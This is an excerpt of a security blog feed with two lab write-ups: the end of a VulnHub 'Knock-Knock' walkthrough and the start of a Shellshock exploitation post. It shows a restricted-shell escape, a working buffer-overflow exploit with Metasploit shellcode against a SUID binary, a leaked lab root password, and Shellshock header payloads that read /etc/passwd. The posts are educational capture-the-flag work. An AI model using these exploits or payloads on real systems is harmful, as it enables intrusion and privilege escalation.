+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+You have new mail.
+Last login: Mon Oct 13 15:21:04 2014 from 172.16.246.129
+jason@knockknock:~$ 
+</code></pre>
+
+<h2>Restricted shell escape</h2>
+
+<p>Ha! We&rsquo;ve got a shell! Let&rsquo;s poke around. We&rsquo;ll quickly discover that we&rsquo;re in a limited shell.</p>
+
+<pre><code>jason@knockknock:~$ echo $SHELL
+/bin/rbash
+</code></pre>
+
+<p>But thanks to <a href="https://knapsy.github.io/blog/2014/10/05/persistence-vm-writeup/">Persistence</a>, I&rsquo;ve learned couple ways of bypassing that, so straight away, I used the same technique as I did in Persistence.</p>
+
+<pre><code>jason@knockknock:~$ ftp
+ftp&gt; !/bin/bash
+jason@knockknock:~$ echo $SHELL
+/bin/rbash
+jason@knockknock:~$ export SHELL="/bin/bash"
+jason@knockknock:~$ echo $SHELL
+/bin/bash
+</code></pre>
+
+<h2>Core dump(ster) diving</h2>
+
+<p>Since now we have a normal shell, we can do regular stuff. First thing that stands out is <code>tfc</code> binary with SUID bit set! We may be able to get our root through there.</p>
+
+<pre><code>jason@knockknock:~$ ls -al
+total 32
+drwxr-xr-x 2 jason jason 4096 Oct 14 12:25 .
+drwxr-xr-x 3 root  root  4096 Sep 24 21:03 ..
+lrwxrwxrwx 1 jason jason    9 Sep 26 09:50 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 jason jason  220 Sep 24 21:03 .bash_logout
+-rw-r--r-- 1 jason jason 3398 Sep 25 21:58 .bashrc
+-rw-r--r-- 1 jason jason  675 Sep 24 21:03 .profile
+-rwsr-xr-x 1 root  jason 7457 Oct 11 18:35 tfc
+-rw------- 1 jason jason 3204 Oct 14 05:31 .viminfo
+</code></pre>
+
+<p>Let&rsquo;s see what it is.</p>
+
+<pre><code>jason@knockknock:~$ strings tfc 
+/lib/ld-linux.so.2
+lWGI
+__gmon_start__
+libc.so.6
+_IO_stdin_used
+strrchr
+puts
+printf
+read
+close
+open
+strcmp
+__libc_start_main
+write
+__xstat
+__lxstat
+GLIBC_2.0
+PTRhp
+QVh$
+[^_]
+    Tiny File Crypter - 1.0
+Usage: ./tfc &lt;filein.tfc&gt; &lt;fileout.tfc&gt;
+&gt;&gt; Filenames need a .tfc extension
+&gt;&gt; No symbolic links!
+&gt;&gt; Failed to open input file
+&gt;&gt; Failed to create the output file
+&gt;&gt; File crypted, goodbye!
+;*2$"
+_______________________________  
+\__    ___/\_   _____/\_   ___ \ 
+  |    |    |    __)  /    \  \/ 
+  |    |    |     \   \     \____
+  |____|    \___  /    \______  /
+                \/            \/ 
+</code></pre>
+
+<p>Looks like some type of file encrypter, let&rsquo;s test it out.</p>
+
+<pre><code>jason@knockknock:~$ echo "test" &gt; in.tfc
+jason@knockknock:~$ ./tfc in.tfc out.tfc
+&gt;&gt; File crypted, goodbye!
+jason@knockknock:~$ cat out.tfc 
+��i�jason@knockknock:~$ 
+</code></pre>
+
+<p>Ok, so it does encrypt the input. Let&rsquo;s see what happens when we provide a huge input, maybe we&rsquo;ll be able to trigger buffer overflow condition.</p>
+
+<pre><code>jason@knockknock:~$ python -c 'print "A" * 6000' &gt; in.tfc
+jason@knockknock:~$ ./tfc in.tfc out.tfc
+Segmentation fault
+</code></pre>
+
+<p>Promising! Let&rsquo;s see what protections are enabled on it.</p>
+
+<pre><code>root@kali:~# scp checksec.sh jason@172.16.246.133:.
+jason@172.16.246.133's password: 
+checksec.sh                                   100%   26KB  26.5KB/s   00:00    
+</code></pre>
+
+<pre><code>jason@knockknock:~$ ./checksec.sh --file tfc
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   tfc
+</code></pre>
+
+<p>Wow, everything disabled! That&rsquo;s gonna be one quick and easy exploit&hellip; well, at least that&rsquo;s what I thought!</p>
+
+<p>Let&rsquo;s get a copy of binary to our Kali (knock-knock doesn&rsquo;t have gdb on it) and debug it in gdb to see if we can overwrite return address.</p>
+
+<pre><code>root@kali:~# python -c 'print "A" * 6000' &gt; in.tfc
+root@kali:~# gdb tfc 
+GNU gdb (GDB) 7.4.1-debian
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i486-linux-gnu".
+For bug reporting instructions, please see:
+&lt;http://www.gnu.org/software/gdb/bugs/&gt;...
+Reading symbols from /root/tfc...(no debugging symbols found)...done.
+(gdb) run in.tfc out.tfc
+Starting program: /root/tfc in.tfc out.tfc
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0675c916 in ?? ()
+</code></pre>
+
+<p>Huh? 0x0675c916? Where&rsquo;s my 0x41414141? I think the entire input (even out of bounds) is getting encrypted&hellip; oh boy, that&rsquo;s gonna be fun.</p>
+
+<p>I started playing around with inputs and analysing the behaviour of the encryption, when I suddenly came up with an idea to see what will happen if I will pass in encrypted output as an input:</p>
+
+<pre><code>root@kali:~# echo "hello" &gt; in.tfc
+root@kali:~# ./tfc in.tfc out.tfc 
+&gt;&gt; File crypted, goodbye!
+root@kali:~# ./tfc out.tfc out2.tfc
+&gt;&gt; File crypted, goodbye!
+root@kali:~# cat out2.tfc 
+hello
+</code></pre>
+
+<p>Sweet, that could be potentially useful! It means that I should be able to encode my payload and then pass it in as an input and it should work! Yeah, not really&hellip; I actually won&rsquo;t be able to get my full payload (shellcode etc.) encrypted as I will need to write out of bounds, and the application will crash instead of giving me my output.</p>
+
+<p>From the analysis I did, it was also impossible to just encrypt shellcode and append it to the end of actual payload as the decryption would be different. Ahhh, seems like the only option is to reverse engineer the encryption mechanism and implement my own, with bigger buffer, pass my exploit payload through it, encrypt it, and then passed the encrypted one into the <code>tfc</code> to exploit it. Seems like a lot of work&hellip; and I&rsquo;m not that strong with super detailed analysis of assembly (at least not yet!). Hmmmmm&hellip; what else can I do!</p>
+
+<p>And then it hit me. A lot of useful, debugging information is in the dumped core files! How about if I&rsquo;ll just extract entire encoded input from dumped core, instead of reverse engineering the encryption? Sounds like a plan!</p>
+
+<p>To allow cores being dumped we can just increase maximum size of core files created by running:</p>
+
+<pre><code>root@kali:~# ulimit -c unlimited
+</code></pre>
+
+<p>But first, how do I know what exactly to extract? I will need to know offset of where to start and length of the input I need.</p>
+
+<p>With trial and error (basically passing in input of varying lengths and checking value of return address in gdb), I was able to figure out how many bytes to pass in to overwrite the return address (4124 bytes).</p>
+
+<p>Cool, now we need to know where to start.</p>
+
+<p>Analysing encrypted output, I realised that the input with &ldquo;A&#8221;s always starts with the same bytes (as long as there&rsquo;s more than 4 &#8220;A&#8221;s - but that&rsquo;s the way the encrypting algorithm works - I did a simple analysis of it in IDA).</p>
+
+<pre><code>root@kali:~# python -c 'print "A" * 100' &gt; in.tfc
+root@kali:~# ./tfc in.tfc out.tfc
+&gt;&gt; File crypted, goodbye!
+root@kali:~# xxd out.tfc | head
+0000000: def0 5bab 5df7 ab43 0690 fe64 6cb0 0b48  ..[.]..C...dl..H
+</code></pre>
+
+<p>So, as long as there&rsquo;s only one occurence of <code>def0 5bab</code> in the core, we have all information we need. Let&rsquo;s check the core.</p>
+
+<pre><code>root@kali:~# python -c 'print "A" * 6000' &gt; in.tfc
+root@kali:~# ./tfc in.tfc out.tfc 
+Segmentation fault (core dumped)
+root@kali:~# xxd core | grep 'def0 5bab'
+0030700: def0 5bab 5df7 ab43 0690 fe64 6cb0 0b48  ..[.]..C...dl..H
+</code></pre>
+
+<p>Awesome! Now we can craft our exploit and extract its encrypted version from the core.</p>
+
+<p>But we need few more things for our exploit to make it work, address of a <code>jmp esp</code> instruction to overwrite return address with (to tell the program to jump to the top of the stack) and actual shellcode (we&rsquo;ll use metasploit payload generator).</p>
+
+<p>To get <code>jmp esp</code> address, we&rsquo;ll use <code>msfelfscan</code>.</p>
+
+<pre><code>root@kali:~# msfelfscan -j esp tfc 
+[tfc]
+0x08048e93 jmp esp
+0x08048e93 jmp esp
+</code></pre>
+
+<p>Sweet, the address doesn&rsquo;t have null bytes, so that makes it easier (otherwise it would probably messed up our exploit, as it would be treated as end of string).</p>
+
+<p>Now the shellcode. We&rsquo;ll use metasploit to generate something that would suit our needs.</p>
+
+<pre><code>root@kali:~/exploit# msfconsole
+
+IIIIII    dTb.dTb        _.---._
+  II     4'  v  'B   .'"".'/|\`.""'.
+  II     6.     .P  :  .' / | \ `.  :
+  II     'T;. .;P'  '.'  /  |  \  `.'
+  II      'T; ;P'    `. /   |   \ .'
+IIIIII     'YvP'       `-.__|__.-'
+
+I love shells --egypt
+
+
+Love leveraging credentials? Check out bruteforcing
+in Metasploit Pro -- learn more on http://rapid7.com/metasploit
+
+       =[ metasploit v4.10.0-2014100201 [core:4.10.0.pre.2014100201 api:1.0.0]]
++ -- --=[ 1349 exploits - 742 auxiliary - 217 post        ]
++ -- --=[ 340 payloads - 35 encoders - 8 nops             ]
++ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
+
+msf &gt; use payload/linux/x86/
+use payload/linux/x86/adduser
+use payload/linux/x86/chmod
+use payload/linux/x86/exec
+use payload/linux/x86/meterpreter/bind_ipv6_tcp
+use payload/linux/x86/meterpreter/bind_nonx_tcp
+use payload/linux/x86/meterpreter/bind_tcp
+use payload/linux/x86/meterpreter/find_tag
+use payload/linux/x86/meterpreter/reverse_ipv6_tcp
+use payload/linux/x86/meterpreter/reverse_nonx_tcp
+use payload/linux/x86/meterpreter/reverse_tcp
+use payload/linux/x86/metsvc_bind_tcp
+use payload/linux/x86/metsvc_reverse_tcp
+use payload/linux/x86/read_file
+use payload/linux/x86/shell/bind_ipv6_tcp
+use payload/linux/x86/shell/bind_nonx_tcp
+use payload/linux/x86/shell/bind_tcp
+use payload/linux/x86/shell/find_tag
+use payload/linux/x86/shell/reverse_ipv6_tcp
+use payload/linux/x86/shell/reverse_nonx_tcp
+use payload/linux/x86/shell/reverse_tcp
+use payload/linux/x86/shell_bind_ipv6_tcp
+use payload/linux/x86/shell_bind_tcp
+use payload/linux/x86/shell_bind_tcp_random_port
+use payload/linux/x86/shell_find_port
+use payload/linux/x86/shell_find_tag
+use payload/linux/x86/shell_reverse_tcp
+use payload/linux/x86/shell_reverse_tcp2
+msf &gt; use payload/linux/x86/exec 
+msf payload(exec) &gt; show options
+
+Module options (payload/linux/x86/exec):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+   CMD                    yes       The command string to execute
+
+msf payload(exec) &gt; set CMD /bin/sh
+CMD =&gt; /bin/sh
+msf payload(exec) &gt; show options
+
+Module options (payload/linux/x86/exec):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+   CMD   /bin/sh          yes       The command string to execute
+
+msf payload(exec) &gt; generate -b '\x00'
+# linux/x86/exec - 70 bytes
+# http://www.metasploit.com
+# Encoder: x86/shikata_ga_nai
+# VERBOSE=false, PrependFork=false, PrependSetresuid=false, 
+# PrependSetreuid=false, PrependSetuid=false, 
+# PrependSetresgid=false, PrependSetregid=false, 
+# PrependSetgid=false, PrependChrootBreak=false, 
+# AppendExit=false, CMD=/bin/sh
+buf = 
+"\xdb\xd0\xbd\x79\xf6\x5f\x15\xd9\x74\x24\xf4\x58\x33\xc9" +
+"\xb1\x0b\x31\x68\x1a\x03\x68\x1a\x83\xc0\x04\xe2\x8c\x9c" +
+"\x54\x4d\xf7\x33\x0d\x05\x2a\xd7\x58\x32\x5c\x38\x28\xd5" +
+"\x9c\x2e\xe1\x47\xf5\xc0\x74\x64\x57\xf5\x8f\x6b\x57\x05" +
+"\xbf\x09\x3e\x6b\x90\xbe\xa8\x73\xb9\x13\xa1\x95\x88\x14"
+</code></pre>
+
+<p>Bunch of shellcodes available for our target system, we&rsquo;ll use one that executes command, and the command will of course be <code>/bin/sh</code> :)</p>
+
+<p>Also, generating payload with <code>-b</code> switch allows us to specify characters to blacklist. We don&rsquo;t want any null bytes in our shellcode, so we&rsquo;ll blacklist that.</p>
+
+<p><em>EDIT: Thanks to <a href="https://twitter.com/TheColonial">TheColonial</a> for pointing this out - getting rid of NULL bytes is actually not required. NULL bytes are fine as we&rsquo;re reading from file and an entire file is read into memory!</em></p>
+
+<p>Ok, now we have all we need. Let&rsquo;s have a look how our final exploit will look like.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Metasploit</span> <span class="n">generated</span> <span class="n">shellcode</span> <span class="o">-</span> <span class="mi">70</span> <span class="nb">bytes</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">shellcode</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">xdb</span>\<span class="n">xd0</span>\<span class="n">xbd</span>\<span class="n">x79</span>\<span class="n">xf6</span>\<span class="n">x5f</span>\<span class="n">x15</span>\<span class="n">xd9</span>\<span class="n">x74</span>\<span class="n">x24</span>\<span class="n">xf4</span>\<span class="n">x58</span>\<span class="n">x33</span>\<span class="n">xc9</span>\<span class="n">xb1</span>\<span class="n">x0b</span>\<span class="n">x31</span>\<span class="n">x68</span>\<span class="n">x1a</span>\<span class="n">x03</span>\<span class="n">x68</span>\<span class="n">x1a</span>\<span class="n">x83</span>\<span class="n">xc0</span>\<span class="n">x04</span>\<span class="n">xe2</span>\<span class="n">x8c</span>\<span class="n">x9c</span>\<span class="n">x54</span>\<span class="n">x4d</span>\<span class="n">xf7</span>\<span class="n">x33</span>\<span class="n">x0d</span>\<span class="n">x05</span>\<span class="n">x2a</span>\<span class="n">xd7</span>\<span class="n">x58</span>\<span class="n">x32</span>\<span class="n">x5c</span>\<span class="n">x38</span>\<span class="n">x28</span>\<span class="n">xd5</span>\<span class="n">x9c</span>\<span class="n">x2e</span>\<span class="n">xe1</span>\<span class="n">x47</span>\<span class="n">xf5</span>\<span class="n">xc0</span>\<span class="n">x74</span>\<span class="n">x64</span>\<span class="n">x57</span>\<span class="n">xf5</span>\<span class="n">x8f</span>\<span class="n">x6b</span>\<span class="n">x57</span>\<span class="n">x05</span>\<span class="n">xbf</span>\<span class="n">x09</span>\<span class="n">x3e</span>\<span class="n">x6b</span>\<span class="n">x90</span>\<span class="n">xbe</span>\<span class="n">xa8</span>\<span class="n">x73</span>\<span class="n">xb9</span>\<span class="n">x13</span>\<span class="n">xa1</span>\<span class="n">x95</span>\<span class="n">x88</span>\<span class="n">x14</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">content</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">A</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="mi">4124</span>             <span class="c"># fill up the buffer</span>
+</span><span class='line'><span class="n">content</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x93</span>\<span class="n">x8e</span>\<span class="n">x04</span>\<span class="n">x08</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>    <span class="c"># overwrite return address with address of &amp;lsquo;jmp esp&amp;rsquo; instruction</span>
+</span><span class='line'><span class="n">content</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x83</span>\<span class="n">xec</span>\<span class="n">x7f</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>        <span class="c"># instruction code for &amp;lsquo;sub $esp, 175&amp;rsquo; to make space on the stack for the shellcode (basically rewinding stack)</span>
+</span><span class='line'><span class="n">content</span> <span class="o">+=</span> <span class="n">shellcode</span>             <span class="c"># our shellcode (70 bytes)</span>
+</span><span class='line'><span class="n">content</span> <span class="o">+=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span>\<span class="n">x90</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span> <span class="mi">105</span>          <span class="c"># padding after the shellcode to ensure nothing immediatelly after the shellcode is executed as well and therefore corrupting our shellcode&lt;/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Print</span> <span class="n">the</span> <span class="n">exploit</span> <span class="p">(</span><span class="n">we</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="n">ll</span> <span class="n">redirect</span> <span class="n">output</span> <span class="n">to</span> <span class="nb">file</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="n">content</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Alright, let&rsquo;s rock&#8217;n&#8217;roll, print exploit to file, run it through <code>tfc</code>, extract encrypted exploit from core, pass it in again and it should work!</p>
+
+<pre><code>root@kali:~# python exploit.py &gt; exploit.in.tfc
+root@kali:~# ./tfc exploit.in.tfc exploit.out.tfc
+Segmentation fault (core dumped)
+root@kali:~# xxd core | grep 'def0 5bab'
+002fe00: def0 5bab 5df7 ab43 0690 fe64 6cb0 0b48  ..[.]..C...dl..H
+</code></pre>
+
+<p>Use <code>dd</code> to carve out what we need, byte by byte, skipping first 196096 bytes (002fe00 in hex - as above) and grabbing all 4306 bytes (total length of our exploit):</p>
+
+<pre><code>root@kali:~# dd if=core of=exploit.out.tfc skip=196096 count=4306 bs=1
+4306+0 records in
+4306+0 records out
+4306 bytes (4.3 kB) copied, 0.017911 s, 240 kB/s
+root@kali:~# ./tfc exploit.out.tfc pwnd.tfc
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# 
+</code></pre>
+
+<p>Woohooooo, so it works locally on our Kali! All we have left to do is copy our encrypted payload onto knock-knock and run it there.</p>
+
+<pre><code>root@kali:~# scp exploit.out.tfc jason@172.16.246.133:.
+jason@172.16.246.133's password: 
+exploit.out.tfc                               100% 4306     4.2KB/s   00:00    
+</code></pre>
+
+<pre><code>jason@knockknock:~$ ./tfc exploit.out.tfc pwned.tfc
+# whoami
+root
+# cd /root
+# ls
+crpt.py  server.py  start.sh  the_flag_is_in_here
+# cd the_flag_is_in_here
+# ls
+qQcmDWKM5a6a3wyT.txt
+# cat *    
+ __                         __              __                         __      ____ 
+|  | __ ____   ____   ____ |  | __         |  | __ ____   ____   ____ |  | __ /_   |
+|  |/ //    \ /  _ \_/ ___\|  |/ /  ______ |  |/ //    \ /  _ \_/ ___\|  |/ /  |   |
+|    &lt;|   |  (  &lt;_&gt; )  \___|    &lt;  /_____/ |    &lt;|   |  (  &lt;_&gt; )  \___|    &lt;   |   |
+|__|_ \___|  /\____/ \___  &gt;__|_ \         |__|_ \___|  /\____/ \___  &gt;__|_ \  |___|
+     \/    \/            \/     \/              \/    \/            \/     \/       
+
+Hooray you got the flag!
+
+Hope you had as much fun r00ting this as I did making it!
+
+Feel free to hit me up in #vulnhub @ zer0w1re
+
+Gotta give a big shout out to c0ne, who helpped to make the tfc binary challenge,
+as well as rasta_mouse, and recrudesce for helping to find bugs and test the VM :)
+
+root password is "qVx4UJ*zcUdc9#3C$Q", but you should already have a shell, right? ;)
+# 
+</code></pre>
+
+<h2>Summary</h2>
+
+<p>Pretty awesome challenge! Really exercised my brain cells and I&rsquo;m glad I came up with a simple method of exploiting it without going into reverse engineering of the encryption mechanism.</p>
+
+<p>I have actually started reversing it and got a fair bit into it, but then got this core dump idea and decided to write it up this way.</p>
+
+<p>I saw other guys reverse engineered the encryption mechanism and got it working as well, I&rsquo;d recommend for you to go and check out what <a href="https://leonjza.github.io/blog/2014/10/14/knock-knock-whos-there-solving-knock-knock/">leonjza</a> and <a href="http://barrebas.github.io/blog/2014/10/14/knock-knock-knocking-on-roots-door/">barrebas</a> did!</p>
+
+<p>Again, awesome challenge - big thanks to <a href="http://vulnhub.com">VulnHub</a> and <a href="https://twitter.com/zer0w1re">zer0w1re</a>!</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Basic Shellshock Exploitation]]></title>
+    <link href="http://knapsy.github.io/blog/2014/10/07/basic-shellshock-exploitation/"/>
+    <updated>2014-10-07T22:38:09+11:00</updated>
+    <id>http://knapsy.github.io/blog/2014/10/07/basic-shellshock-exploitation</id>
+    <content type="html"><![CDATA[<p>Unless you were living under the rock for the last 2 weeks or so, you probably heard about a vulnerability in Bourne Again Shell (BASH), aka &ldquo;Shellshock&rdquo; (who comes up with those names?!) aka &ldquo;Bash bug&rdquo; aka &ldquo;OMG! Internet is coming to an end&rdquo; aka&hellip; you get the idea :)</p>
+
+<p>Working in security field, I have heard about it a lot, maybe even too much in the last couple weeks and, after it has been publicly announced, I saw lots of failed exploitation attempts hitting Internet facing servers under my jurisdiction.</p>
+
+<p>I have researched the vulnerability (<a href="http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6271">CVE-2014-6271</a> and other flavours of it) a fair bit, saw heaps of malicious traffic, but actually never seen a successful exploit (well, that&rsquo;s a good thing I guess&hellip;) and never had a chance to play with it on an actual vulnerable machine.</p>
+
+<p>And yet, here it comes <a href="http://vulnhub.com">vulnhub.com</a> again with a tiny VM created specifically for this purpose - to get your hands dirty with this particular vulnerability. So&hellip; let&rsquo;s get started, shall we?</p>
+
+<!-- more -->
+
+
+<h2>Shock that shell</h2>
+
+<p>I&rsquo;ll omit the recon phase and just jump straight to the essence.</p>
+
+<p>We have a simple VM running a web server on port 80, the site looks like this:</p>
+
+<p><img src="/images/posts/2014-10-07-basic-shellshock-exploitation/main_page.png" title="Main Page" alt="Main Page" /></p>
+
+<p>Let&rsquo;s look at the source. Immediatelly we see something interesting:</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="o">&lt;</span><span class="err">/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+</span><span class='line'>    <span class="kd">function</span> <span class="nx">status</span><span class="p">()</span> <span class="p">{</span>
+</span><span class='line'>        <span class="nx">$</span><span class="p">.</span><span class="nx">getJSON</span><span class="p">(</span><span class="s2">&quot;/cgi-bin/status&quot;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>            <span class="nx">$</span><span class="p">.</span><span class="nx">each</span><span class="p">(</span> <span class="nx">data</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span> <span class="nx">key</span><span class="p">,</span> <span class="nx">val</span> <span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;#infos&#39;</span><span class="p">).</span><span class="nx">append</span> <span class="p">(</span> <span class="s2">&quot;&lt;li&gt;&lt;b&gt;&quot;</span><span class="o">+</span><span class="nx">key</span><span class="o">+</span><span class="s2">&quot;&lt;/b&gt;: &quot;</span> <span class="o">+</span> <span class="nx">val</span> <span class="o">+</span> <span class="s2">&quot;&lt;/li&gt;&quot;</span> <span class="p">);</span>
+</span><span class='line'>            <span class="p">});</span>
+</span><span class='line'>        <span class="p">});</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>    <span class="nx">status</span><span class="p">();</span>
+</span><span class='line'><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>We have a cgi script that runs system commands and displays them on a webpage - all conditions met for our Shellshock vulnerability!</p>
+
+<p>All we need to do now is to exploit the vulnerability by providing a crafted shell command in one of the HTTP headers, that then will be processed by the webserver as an environment variable and, as a result, executed on the system.</p>
+
+<p>Generally, the most common HTTP headers that I saw being targeted are:</p>
+
+<ul>
+<li>User-Agent</li>
+<li>Host</li>
+<li>Referer</li>
+</ul>
+
+
+<p>Let&rsquo;s try modifying User-Agent header. I&rsquo;ll be using Burp repeater as it should be the easiest to play around with and modify the request when needed.</p>
+
+<p>Start up burpsuite:</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# burpsuite</span></code></pre></td></tr></table></div></figure></p>
+
+<p>And craft the HTTP request:</p>
+
+<p><em>Note: make sure there are 2 empty lines at the end of your raw request in Burp, otherwise the request won&rsquo;t work!</em></p>
+
+<p><img src="/images/posts/2014-10-07-basic-shellshock-exploitation/burp.png" title="Burp" alt=" burp " /></p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>GET /cgi-bin/status HTTP/1.0
+</span><span class='line'>user-agent: () { :; }; /bin/bash -c &lsquo;echo vulnerable!&rsquo;&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>
+
+<p>Response:</p>
+
+<p><img src="/images/posts/2014-10-07-basic-shellshock-exploitation/burp_fail.png" title="Burp fail response" alt=" Burp fail response " /></p>
+
+<p>Hmm&hellip; no response displayed on the screen, neither in the headers (I saw some examples where echo came back in headers, I guess it&rsquo;s not the case in this instance).</p>
+
+<p>Let&rsquo;s try some other commands:</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>GET /cgi-bin/status HTTP/1.0
+</span><span class='line'>user-agent: () { :; }; /bin/bash -c &lsquo;cat /etc/passwd&rsquo;&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>
+
+<p>But again, the same error message and no output displayed back. Is it even working? Let&rsquo;s try to ping back our Kali.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>GET /cgi-bin/status HTTP/1.0
+</span><span class='line'>user-agent: () { :; }; /bin/bash -c &lsquo;ping -c 3 172.16.246.129&rsquo;&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>
+
+<p>Listening for ping:</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# tcpdump -i eth0 -n icmp
+</span><span class='line'>tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+</span><span class='line'>listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
+</span><span class='line'>20:02:14.854659 IP 172.16.246.132 > 172.16.246.129: ICMP echo request, id 18947, seq 0, length 64
+</span><span class='line'>20:02:14.854706 IP 172.16.246.129 > 172.16.246.132: ICMP echo reply, id 18947, seq 0, length 64
+</span><span class='line'>20:02:15.856028 IP 172.16.246.132 > 172.16.246.129: ICMP echo request, id 18947, seq 1, length 64
